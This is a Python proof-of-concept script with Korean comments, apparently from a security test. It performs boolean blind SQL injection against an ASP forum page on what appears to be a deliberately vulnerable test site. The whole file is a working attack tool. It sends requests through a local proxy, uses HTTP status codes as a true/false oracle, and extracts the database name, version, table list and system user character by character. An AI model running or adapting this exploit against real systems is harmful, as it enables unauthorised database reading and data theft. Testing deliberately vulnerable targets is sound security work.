#!/usr/bin/env python3
"""Round 3 (계속-3) — 블라인드 SQLi 실제 데이터 추출 PoC.

오라클: showforum.asp?id=1 AND <조건>
  200 → 조건 참 / 행 존재       500 → 조건 거짓(0행) 또는 SQL 오류
(1 AND 1=1 → 200, 1 AND 1=2 → 500 으로 이미 검증됨)

추출 대상은 MSSQL 시스템 카탈로그에서 조회한 값 — 즉 DB 임의 읽기가 가능함을 증명한다.
"""
import subprocess, urllib.parse, sys, time

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
REQ = 0


def oracle(cond: str) -> bool:
    """1 AND <cond> 가 참이면 200."""
    global REQ
    url = f"{BASE}/showforum.asp?id=" + urllib.parse.quote("1 AND " + cond)
    p = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}"]
                       + PROXY + ["-m", "25", url], capture_output=True, text=True)
    REQ += 1
    time.sleep(0.05)
    return p.stdout.strip() == "200"


def xlen(expr: str, maxn: int = 60) -> int | None:
    for n in range(1, maxn + 1):
        if oracle(f"LEN(({expr}))={n}"):
            return n
    return None


def xchar(expr: str, i: int) -> str:
    lo, hi = 0, 127
    while lo < hi - 1:
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING(({expr}),{i},1))>{mid}"):
            lo = mid
        else:
            hi = mid
    return chr(hi)


def xstr(label: str, expr: str, maxlen: int = 60) -> str:
    n = xlen(expr, maxlen)
    if n is None:
        print(f"  [{label}] 길이 판별 실패(응답이 계속 거짓) — expr: {expr}")
        return ""
    out = "".join(xchar(expr, i) for i in range(1, n + 1))
    print(f"  [{label}] len={n}  value = {out!r}   (누적 요청 {REQ})")
    return out


print(f"### 오라클 사전 확인")
print(f"  TRUE  (1 AND 1=1)  -> {oracle('1=1')}")
print(f"  FALSE (1 AND 1=2)  -> {oracle('1=2')}")
_mssql_probe = oracle("LEN('a')=1")
print(f"  MSSQL 식별 LEN()   -> {_mssql_probe}")
print()

print("### 추출 1: DB_NAME()")
xstr("DB_NAME()", "DB_NAME()")

print("\n### 추출 2: @@VERSION (앞 60자)")
xstr("@@VERSION", "@@version", 60)

print("\n### 추출 3: 사용자 테이블 목록 (sysobjects)")
xstr("tables", "SELECT name+',' FROM sysobjects WHERE xtype='U' ORDER BY name FOR XML PATH('')", 120)

print("\n### 추출 4: 현재 DB 사용자/시스템 계정")
xstr("SYSTEM_USER", "SYSTEM_USER")

print("\n### 추출 5: DB 내 사용자 이름 목록 (forum users 테이블 추정)")
for tbl in ["users", "Users", "tblUsers", "user", "members"]:
    got = xstr(f"COUNT(*) FROM {tbl}",
               f"SELECT CAST(COUNT(*) AS varchar(10)) FROM {tbl}")
    if got:
        break

print(f"\n### 총 요청 수: {REQ}")
